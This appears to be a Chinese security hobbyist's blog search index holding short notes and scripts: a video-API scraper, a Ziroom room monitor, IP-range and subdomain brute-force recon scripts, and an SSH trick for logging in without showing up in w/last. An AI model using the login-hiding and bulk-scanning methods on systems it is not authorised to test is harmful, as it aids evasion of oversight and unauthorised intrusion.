<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[xiaoxiaofuli]]></title>
    <url>%2F2018%2F10%2F17%2Fxiaoxiaofulli%2F</url>
    <content type="text"><![CDATA[APK–API[] [centos_shell]12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/env python# -*- coding: utf-8 -*-"""Created on Sat Apr 28 15:52:59 2018@author: root"""import requestsimport timeimport datetimeimport reimport randomheaders = &#123; 'Accept-Language': 'zh-CN,zh;q=0.8', 'Host': 'www.js.baidu.com.ylgsrnzxlxpyb9cenfdfef6g.com', 'Accept-Encoding': 'gzip', 'cookie': '__cfduid=dbc9ff34639e222aa9cc0eb395de4d41b1539066777', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0',&#125;def get_page(url): try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() except requests.ConnectionError as e: print('Error', e.args) if __name__ == '__main__': page = 0 while (1): url = "http://www.js.baidu.com.ylgsrnzxlxpyb9cenfdfef6g.com/api/public/?service=Video.getNearby&amp;uid=-1&amp;lng=0.0&amp;lat=0.0&amp;p=" + str(page)# print(url) time.sleep(random.randint(1,10)) json_dict = get_page(url) print(page) page = page + 1 # print(json_dict) items = json_dict['data']['info'] for item in items: uid = item['uid'] href = item['href'] with open("urlaaaaa.txt", 'a+') as f: f.write(href) continue]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH login history Hide]]></title>
    <url>%2F2018%2F09%2F07%2Fssh_login_hide%2F</url>
    <content type="text"><![CDATA[w和last命令内不显示登录痕迹 ssh -lroot 127.0.0.1 /usr/bin/bash #登录之后直接调用bash ssh -lroot 127.0.0.1 /usr/bin/ls #登录之后直接调用命令 ssh -T root@127.0.0.1 /usr/bin/bash -i # -T表示不分配伪终端 -i表示是交互式shell 查找登录痕迹 lsof -i:22 | grep EST ps -ef | grep ssh 历史痕迹： /var/log/secure /var/log/auth.log]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[互联网资产搜集思路]]></title>
    <url>%2F2018%2F09%2F04%2F%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF%2F</url>
    <content type="text"><![CDATA[给定域名、部分IP： 整理成C段IP， [] [centos_shell]123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/python# -*- coding:utf-8 -*-#exp:192.168.1.1 &gt;&gt;&gt; 192.168.1.0/24import re # def cleanCLRFspace(content):# noCLContext = content.replace('\n','')# noSpaceCLRFcontext = noCLContext.strip()# return noSpaceCLRFcontext def readFile(): ipf = open('./content.txt','r') return ipf def getLineIP(ipf): ipList = set() texts = ipf.readlines() for text in texts: ips = re.findall(r'\d+\.\d+?\.\d+?\.\d+?',text) for ip in ips: ipList.add(ip) return ipList def ip2c(ipNoDup): ipset = set() for ip in ipNoDup: ipset.add(re.findall(r'\d+?\.\d+?\.\d+?\.',ip)[0] + '0/24') iplist = list(ipset) iplist.sort() return iplist def saveContext(s): wfile = open('./result.txt','w') for i in s: wfile.write(i+'\n') wfile.close() if __name__ == '__main__': ipf = readFile() ipList = getLineIP(ipf) iplist = ip2c(ipList) saveContext(iplist) [] [centos_shell]123456789101112131415161718#!/bin/bash#使用方法：./*.sh Cip.txt#备注：192.168.1.0/24 &gt;&gt;&gt; 192.168.1.0-192.168.1.254 范围IPwhile read IPRANGEdo IP_FILE_NAME=$(echo $IPRANGE | cut -d/ -f1) IP_1="$(echo $IPRANGE | cut -d"." -f1-2)." IP_3="$(echo $IPRANGE | cut -d"." -f3)" MAX_IP_3="$(sipcalc $IPRANGE | awk -F. '/Usable range/&#123;print $6&#125;')" for i in $(seq $IP_3 $MAX_IP_3) do for j in $(seq 1 254) do echo "$&#123;IP_1&#125;$&#123;i&#125;.$&#123;j&#125;" &gt;&gt;results.txt done donedone &lt; $1 一步到位：[] [centos_shell]123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226#!/bin/bash#Desc:根据起始IP和结束IP输出IP信息#Usage:./iprange.sh IP.txt#notepad++去重： ^(.*?)$\s+?^(?=.*^\1$) 操作方法如下，快捷键Ctrl+H，在弹出的界面输入表达式，并勾选匹配新行。#换行处理否则报错 /r/n /r 全部替换为 /nwhile read line0do #echo $line1 awk -F $line1 "-" '&#123;print $1,$2&#125;' | while read IPA IPB do IPA1=`echo $IPA | awk -F '.' '&#123;print $1&#125;'` IPA2=`echo $IPA | awk -F '.' '&#123;print $2&#125;'` IPA3=`echo $IPA | awk -F '.' '&#123;print $3&#125;'` IPA4=`echo $IPA | awk -F '.' '&#123;print $4&#125;'` IPB1=`echo $IPB | awk -F '.' '&#123;print $1&#125;'` IPB2=`echo $IPB | awk -F '.' '&#123;print $2&#125;'` IPB3=`echo $IPB | awk -F '.' '&#123;print $3&#125;'` IPB4=`echo $IPB | awk -F '.' '&#123;print $4&#125;'` IP4_not_equal()&#123; for i in `eval echo &#123;$IPA4..$IPB4&#125;` do echo $IPA1.$IPA2.$IPA3.$i done &#125; IP3_not_equal () &#123; for i in `eval echo &#123;$IPA3..$IPB3&#125;` do if [[ $i = $IPA3 ]] then eval echo "192.168.$i.&#123;$IPA4..255&#125;" |xargs -n 1 elif [[ $i = $IPB3 ]] then eval echo "192.168.$i.&#123;1..$IPB4&#125;" |xargs -n 1 else eval echo "192.168.$i.&#123;1..255&#125;" | xargs -n 1 fi done &#125; IP2_not_equal()&#123; #第二段的变化范围 for n in `eval echo &#123;$IPA2..$IPB2&#125;` do #如果第二段与IPA的第二段相同 if [ $n = $IPA2 ] then #第三段的变化范围为IPA3到255 for m in `eval echo &#123;$IPA3..255&#125;` do #如果第三段与IPA的第三段相同 if [[ $m = $IPA3 ]] then eval echo "$IPA1.$IPA2.$IPA3.&#123;$IPA4..255&#125;" | xargs -n 1 else eval echo "$IPA1.$IPA2.$m.&#123;1..255&#125;" | xargs -n 1 fi done #如果第三段与IPB的第三段相同 elif [ $n = $IPB2 ] then #第三段变化范围为0到IPB3 for x in `eval echo &#123;0..$IPB3&#125;` do #如果第三段与IPB的第三段相同 if [ $x = $IPB3 ] then eval echo "$IPB1.$IPB2.$IPB3.&#123;0..$IPB4&#125;" |xargs -n 1 else eval echo "$IPB1.$IPB2.$x.&#123;0..255&#125;" |xargs -n 1 fi done #如果第二段与IPA和IPB的均不相同 else #第三段变化范围 for y in &#123;0..255&#125; do echo $IPA1.$n.$y.&#123;0..255&#125; |xargs -n 1 done fi done &#125; #定义pass函数，啥事都不做 pass()&#123; echo ""&gt;/dev/null &#125; IP1_not_equal()&#123; #IP第一段的范围 for d1 in `eval echo &#123;$IPA1..$IPB1&#125;` do #&lt;1&gt;如果第一段与IPA1相同 if [[ $d1 = $IPA1 ]] then #第二段IP范围为IPA2到255 for d2 in `eval echo &#123;$IPA2..255&#125;` do #&lt;1.1&gt;如果第二段与IPA2相同 if [[ $d2 = $IPA2 ]] then #第三段IP范围为IPA3到255 for d3 in `eval echo &#123;$IPA3..255&#125;` do #&lt;1.1.1&gt;如果第三段IP与IPA3相同 if [[ $d3 = $IPA3 ]] then for d4 in `eval echo &#123;$IPA4..255&#125;` do echo $d1.$d2.$d3.$d4 done #&lt;1.1.2&gt;如果第三段IP与IP3不同 else for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done fi done #&lt;1.2&gt;如果第二段与IPA2不同 else for d3 in &#123;0..255&#125; do for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done done fi done #&lt;2&gt;如果第一段IP与IPB相同 elif [[ $d1 = $IPB1 ]] then #第二段IP的范围为0到IPB2 for d2 in `eval echo &#123;0..$IPB2&#125;` do #&lt;2.1&gt;如果第二段IP与IPB相同 if [[ $d2 = $IPB2 ]] then #第三段IP范围为0到IPB3 for d3 in `eval echo &#123;0..$IPB3&#125;` do #&lt;2.1.1&gt;如果第三段IP与IPB3相同 if [[ $d3 = $IPB3 ]] then for d4 in `eval echo &#123;0..$IPB4&#125;` do echo $d1.$d2.$d3.$d4 done #&lt;2.1.2&gt;如果第三段IP与IPB3不同 else for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done fi done #&lt;2.2&gt;如果第二段IP与IPB不相同 else #第三段IP范围为&#123;0..255&#125; for d3 in &#123;0..255&#125; do #第四段IP范围为&#123;0.255&#125; for d4 in &#123;0.255&#125; do echo $d1.$d2.$d3.$d4 done done fi done #&lt;3&gt;第一段IP与IPA1和IPB1都不相同 else for d2 in &#123;0..255&#125; do for d3 in &#123;0..255&#125; do for d4 in &#123;0..255&#125; do echo $d1.$d2.$d3.$d4 done done done fi done &#125; print_range_ip()&#123; #&lt;1&gt;如果两IP第一段不同 if [ $IPA1 != $IPB1 ] then IP1_not_equal #&lt;2&gt;如果两IP第一段相同 else #&lt;2.1&gt; 如果第二段IP相同 if [ $IPA2 = $IPB2 ] then #&lt;2.1.1&gt;如果第三段IP不相同 if [[ $IPA3 != $IPB3 ]] then IP3_not_equal #&lt;2.2.2&gt;如果第三段IP相同 else IP4_not_equal fi #&lt;2.2&gt; 如果第二段IP不相同 else IP2_not_equal fi fi &#125; print_range_ip &gt;&gt; allssip.txt donedone &lt; $1 IP整理完通过工具扫描 爆破子域名通过已给url确定一级域名列表：[] [centos_shell]12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python# -*- coding: utf-8 -*-#exp: python *.py url.txt#shell去重命令：awk '!a[$0]++' results.txtimport sysimport shutilimport dns.namefrom tld import get_tldfrom tld.utils import update_tld_names#def getdomain(url):# domain = dns.name.from_text(url).split(3)[1].to_text(omit_final_dot=True)# return(domain)#def getd(url):# update_tld_names()# return(get_tld(url))def getdomain(domain): DomainSuffix = &#123;'info': None, 'coop': None, 'mil': None, 'int': None, 'xxx': None, 'pro': None, 'aero': None, 'idv': None, 'biz': None, 'edu': None, 'org': None, 'net': None, 'gov': None, 'com': None, 'museum': None, 'name': None&#125; Result = [] domain = domain[0:domain.rfind(':')] #去除端口号// url链接不能加http:// if domain.count('.') == 1: return domain PointSplitResult = domain.split('.') if len(filter(lambda x: not x.isdigit(), PointSplitResult)) == 0: return domain if DomainSuffix.has_key(PointSplitResult[-1].lower()): Result = PointSplitResult[-2:] return '.'.join(Result) else: if DomainSuffix.has_key(PointSplitResult[-2].lower()): Result = PointSplitResult[-3:] return '.'.join(Result) else: Result = PointSplitResult[-2:] return '.'.join(Result)if __name__ == '__main__': file = open(sys.argv[1],'r') for line in file.readlines(): line=line.strip('\n')# line = line if '://' in line else 'http://' + line# print line try: print getdomain(line) except Exception as e: print line+"&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;" [] [centos_shell]123456789#!/bin/bash#usage:&gt;.sh domain.txtwhile read line1do #echo $line1 python subDomainsBrute.py -i $line1 --full -o $line1done &lt; $1 [] [centos_shell]123456@echo off&amp;setlocal enabledelayedexpansionfor /f "delims=" %%i in (domain.txt) do set "website=%%i"&amp;call :s !website!pause:spython subDomainsBrute.py -i %1 --full -o %1goto :eof]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>bash</tag>
        <tag>linux</tag>
        <tag>sh</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[recording]]></title>
    <url>%2F2018%2F08%2F17%2Frecording%2F</url>
    <content type="text"><![CDATA[https://media.defcon.org/ last:https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/]]></content>
      <categories>
        <category>recording</category>
      </categories>
      <tags>
        <tag>defcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ziroom--Monitor]]></title>
    <url>%2F2018%2F08%2F13%2Fziroom%2F</url>
    <content type="text"><![CDATA[[] [centos_shell]12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/usr/bin/env python# -*- coding: utf-8 -*-"""Created on Sat Apr 28 15:52:59 2018@author: root"""import requestsimport itchatimport timeimport datetime#itchat.auto_login()itchat.auto_login(hotReload=True)itchat.auto_login(enableCmdQR=-1)#from urllib import requesturl = "http://phoenix.ziroom.com/v7/room/detail.json?house_id=62947781&amp;city_code=110000&amp;id=61544148"headers = &#123; 'accept': 'application/json;version=3', 'Host': 'phoenix.ziroom.com', 'Referer': 'https://hd.ziroom.com/2018/haiyan/index.html?citycode=110000',# 'token': 'd76a826e-bfb4-4421-902e-132418ebedfa', 'User-Agent': 'okhttp/3.10.0',&#125;def get_page(url): try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() except requests.ConnectionError as e: print('Error', e.args)if __name__ == '__main__': n = 0 while (1): n = n+1 json_dict = get_page(url)# print(json_dict) statuss = json_dict['data']['status'] nowTime=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') print("status:",statuss) if statuss == 'zxpzz': print("NOt Time!!!") itchat.send('&lt;'+str(n)+'&gt;'+'骚年~装修配置中&gt;&gt;&gt;'+nowTime, toUserName='filehelper') time.sleep(360) else: print("GOGOGOOGOOO!!!!!") itchat.send('&lt;'+str(n)+'&gt;'+'0o0o0o0~可以预定了--gogogogo&gt;&gt;&gt;'+nowTime, toUserName='filehelper') time.sleep(120)]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>ziroom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【应急响应】自动化脚本]]></title>
    <url>%2F2018%2F06%2F27%2F%E3%80%90%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E3%80%91%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[Welcome to my blog, enter password to read. Decrypt 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